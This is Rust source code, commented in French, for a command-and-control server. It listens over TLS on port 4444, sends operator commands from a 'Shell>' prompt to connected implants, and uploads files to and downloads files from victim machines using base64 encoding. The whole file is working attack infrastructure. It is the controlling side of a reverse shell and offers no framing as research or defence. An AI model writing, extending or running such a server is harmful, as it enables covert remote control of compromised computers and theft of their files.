use std::fs::File;
use std::io::{self, Write, BufRead, BufReader, Read};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;
use std::sync::Arc;
use base64::{Engine as _, engine::general_purpose};

fn main() {
    println!("Démarrage du Serveur C2 en Rust (Full Base64)...");

    let mut file = File::open("identity.pfx").expect("ERREUR: 'identity.pfx' introuvable !");
    let mut identity_bytes = vec![];
    file.read_to_end(&mut identity_bytes).unwrap();
    
    let identity = Identity::from_pkcs12(&identity_bytes, "password").expect("Mauvais mot de passe PFX !");
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = Arc::new(acceptor);

    let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
    println!("[*] En écoute sur le port 4444 (TLS)...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                
                thread::spawn(move || {
                    println!("[*] Connexion entrante...");
                    match acceptor.accept(stream) {
                        Ok(stream) => {
                            println!("[+] Session TLS établie !");
                            let mut reader = BufReader::new(stream);
                            
                            loop {
                                print!("Shell> ");
                                io::stdout().flush().unwrap();
                                
                                let mut command = String::new();
                                io::stdin().read_line(&mut command).unwrap();
                                let command = command.trim().to_string();

                                if command.is_empty() { continue; }
                                if command == "exit" { break; }

                                // --- ENVOI COMMANDE ---
                                let mut final_command = command.clone();
                                let mut skip = false;

                                // Si UPLOAD : on encode le fichier local
                                if command.starts_with("upload") {
                                    let parts: Vec<&str> = command.split_whitespace().collect();
                                    if parts.len() >= 2 {
                                        let local_path = parts[1];
                                        let remote_name = if parts.len() > 2 { parts[2] } else { local_path };
                                        
                                        match std::fs::read(local_path) {
                                            Ok(content) => {
                                                let b64 = general_purpose::STANDARD.encode(&content);
                                                final_command = format!("upload {} {}", b64, remote_name);
                                                println!("[+] Upload: Envoi de {} octets encodés...", content.len());
                                            },
                                            Err(e) => { println!("[-] Erreur fichier local: {}", e); skip = true; }
                                        }
                                    }
                                }

                                if skip { continue; }

                                if let Err(e) = reader.get_mut().write_all(format!("{}\n", final_command).as_bytes()) {
                                    println!("[-] Erreur d'envoi: {}", e); break;
                                }

                                // --- RÉCEPTION RÉPONSE (TOUT EST BASE64) ---
                                let mut buffer = String::new();
                                match reader.read_line(&mut buffer) {
                                    Ok(n) => {
                                        if n == 0 { break; }
                                        let received_b64 = buffer.trim();

                                        // Si c'était un DOWNLOAD, on décode et on écrit sur disque
                                        if command.starts_with("download") {
                                            // On tente de décoder d'abord
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    // On vérifie si c'est un message d'erreur du client (qui serait encodé en B64 aussi)
                                                    let preview = String::from_utf8_lossy(&bytes);
                                                    if preview.starts_with("ERROR:") {
                                                        println!("[-] {}", preview);
                                                    } else {
                                                        // C'est le fichier !
                                                        let parts: Vec<&str> = command.split_whitespace().collect();
                                                        if parts.len() >= 2 {
                                                            let filename = parts[1];
                                                            match File::create(filename) {
                                                                Ok(mut file) => {
                                                                    file.write_all(&bytes).unwrap();
                                                                    println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
                                                                },
                                                                Err(e) => println!("[-] Erreur disque: {}", e),
                                                            }
                                                        }
                                                    }
                                                },
                                                Err(e) => println!("[-] Erreur B64 Download: {}", e),
                                            }
                                        } else {
                                            // COMMANDE STANDARD (dir, whoami...)
                                            // On décode le Base64 et on affiche le texte
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    let response = String::from_utf8_lossy(&bytes);
                                                    println!("{}", response);
                                                },
                                                Err(_) => {
                                                    // Fallback si jamais ce n'était pas du B64
                                                    println!("{}", buffer);
                                                }
                                            }
                                        }
                                    },
                                    Err(e) => { println!("[-] Erreur lecture: {}", e); break; }
                                }
                            }
                        },
                        Err(e) => println!("[-] Handshake échoué: {}", e),
                    }
                });
            }
            Err(_) => (),
        }
    }
}